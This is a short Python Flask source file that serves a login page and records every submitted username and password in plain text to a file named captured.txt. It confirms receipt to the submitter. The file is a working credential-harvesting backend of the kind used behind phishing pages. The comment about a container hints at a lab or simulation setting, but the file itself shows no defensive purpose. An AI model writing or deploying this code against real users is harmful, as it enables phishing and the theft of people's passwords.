from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    # write captured credentials to an explicit path inside the container
    with open("/app/captured.txt", "a", encoding="utf-8") as f:
        f.write(f"{username}\t{password}\n")
    return f"Received credentials for user: {username}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
